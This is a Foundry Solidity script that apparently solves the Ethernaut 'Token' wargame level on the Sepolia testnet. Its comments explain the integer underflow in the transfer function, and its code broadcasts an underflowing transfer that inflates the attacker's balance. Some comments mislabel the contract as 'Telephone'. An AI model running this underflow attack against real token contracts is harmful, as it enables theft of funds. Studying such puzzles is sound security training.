// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Token} from "../src/Token.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0x9ffbda2d0f479a8742f1d17bf72b8ce2a58038ea

contract TokenSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/Token.s.sol --tc TokenSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    Token tokenInstance = Token(0x9fFbDa2d0F479A8742F1D17Bf72b8Ce2A58038ea);

    function run() external {
        // Deploy Token contract (It is better to deploy your instance for the contract to avoid errors)
        if (address(tokenInstance) == address(0)) {
            tokenInstance = _deployTokenContract();
        }
        // We will simulate the attack by the second address, whici is in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // - As you can see in the `Telephone` contract, the contract uses solidity v0.6, and beforms arithmatic operations without checkin over/underflow
        // - In the `transfer` function, if a user sends an amount greater than hist balance, this will result in a big 0ve number
        // - User balance (20), transfered 30 => 20 - 30 => uint256(-10) = big 0ve number
        // - The check will be passed and the balance of the sender instead of decreasing to negative, it will be a huge positive number
        // - The user can transfer any amount of tokens he wants, since he has a very large balance

        console.log("Hacker balance:", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS_2")));
        tokenInstance.transfer(vm.envAddress("MY_ADDRESS"), 20);
        console.log("Hacker balance:", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS_2")));

        vm.stopBroadcast();
    }

    function _deployTokenContract() internal returns (Token) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Token tokenInstance = new Token(7e18);
        console.log("Telephone address:", address(tokenInstance));
        vm.stopBroadcast();
        return tokenInstance;
    }
}
